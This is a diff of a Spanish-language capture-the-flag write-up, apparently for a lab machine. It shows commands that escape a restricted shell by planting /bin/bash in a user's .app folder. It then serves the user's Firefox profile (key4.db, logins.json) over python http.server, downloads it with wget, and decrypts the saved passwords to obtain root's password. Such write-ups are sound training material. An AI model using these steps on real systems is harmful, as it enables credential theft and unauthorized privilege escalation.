@@ -247,9 +247,28 @@ Se me ocurre modificar el nombre de **.app** y con ello crear nuestro propio .ap
 Este paso nos lo podriamos ahorrar si tuvieramos permisos de escritura tambien en .app, pero no es el caso.
 Para ello ejecutaremos estos comandos:
 
-`su -s /bin/bash -c "mv ~/.app ~/.noname" ayush`
-`su -s /bin/bash -c "mkdir ~/.app" ayush`
-`su -s /bin/bash -c "cp /bin/bash ~/.app" ayush`
+- `su -s /bin/bash -c "mv ~/.app ~/.noname" ayush`
+- `su -s /bin/bash -c "mkdir ~/.app" ayush`
+- `su -s /bin/bash -c "cp /bin/bash ~/.app" ayush`
 
 Con esto podriamos ejecutar bash, y de aqui, modificar el path para tener acceso a todos los binarios de la maquina.
 Ahora sí, dentro de la maquina, haremos un reconocimiento, y obtendremos la *flag.txt*
+
+![image](https://user-images.githubusercontent.com/87484792/183463906-9c8cd935-41dd-4cd1-b9a0-5630a6bb684b.png)
+
+Dentro de la carpeta personal de Ayush encontramos una carpeta **.mozilla**. Tras investigar un poco, hay archivos claves que permiten ver las contraseñas almacenadas.
+Estos archivos son **key4.db** y **logins.json**.
+Para esto hay varias formas de hacerlo, podemos descargar la carpeta de mozilla e importarlo en nuestro firefox para posteriormente logearnos en el panel del puerto 10000. O simplemente utilizar algún script que nos muestre las credenciales.
+El segundo paso es más simple, solamente descargue un script, yo utilice firefox_decrypt.py.
+
+Maquina victima (Desde /home/ayush/.mozilla/firefox) :
+`python3 -m http.server 8888`
+
+Maquina atacante:
+`wget -r http://10.10.10.120/bzo7sjt1.default`
+
+Ejecutamos el script, ponemos la contraseña de ayush y ya tendremos la contraseña de root.
+
+![image](https://user-images.githubusercontent.com/87484792/183466069-6a8b3770-6a69-4d69-8c11-f35398411ae5.png)
+
+![image](https://user-images.githubusercontent.com/87484792/183466247-64f24d38-bc6a-4232-b505-2501c920bc54.png)
